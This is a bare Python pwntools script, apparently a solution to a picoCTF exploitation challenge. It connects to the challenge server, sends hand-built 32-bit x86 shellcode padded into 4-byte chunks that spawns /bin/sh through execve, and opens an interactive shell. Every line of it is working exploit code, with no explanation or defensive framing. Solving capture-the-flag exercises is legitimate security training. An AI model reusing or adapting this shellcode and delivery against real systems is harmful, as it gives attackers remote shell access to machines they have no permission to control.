from pwn import *
shellcode = b''
r = remote('mercury.picoctf.net',35338)
#r = process('./fun')
#gdb.attach(r,'break *0x080485c9')

#shellcode += b'\x40\x90\x90\x90'
shellcode += b'\x31\xc9\x90\x90'
shellcode += b'\x31\xd2\x90\x90'
#for c in b'/bin/sh\x00'[::-1]:
#    shellcode += b'\x6a' + bytes([c]) + b'\x90\x90'
shellcode += b'\x31\xc0\x90\x90'
shell = b'/bin/sh\x00'[::-1]
for i in range(0, len(shell), 2):
    shellcode += b'\xb0' + bytes([shell[i+1]]) + b'\x90\x90'
    shellcode += b'\xb4' + bytes([shell[i]]) + b'\x90\x90'
    shellcode += b'\x66\x50\x90\x90'
shellcode += b'\x89\xe3\x90\x90'

shellcode += b'\x31\xc0\x90\x90'
#for i in range(0xb // 2):
#    shellcode += b'\x40\x40\x90\x90'
shellcode += b'\xb0\x0b\x90\x90'
shellcode += b'\xcd\x80\x90\x90'


print('shellcode:')
print(shellcode.hex())
r.sendline(shellcode)
r.interactive()


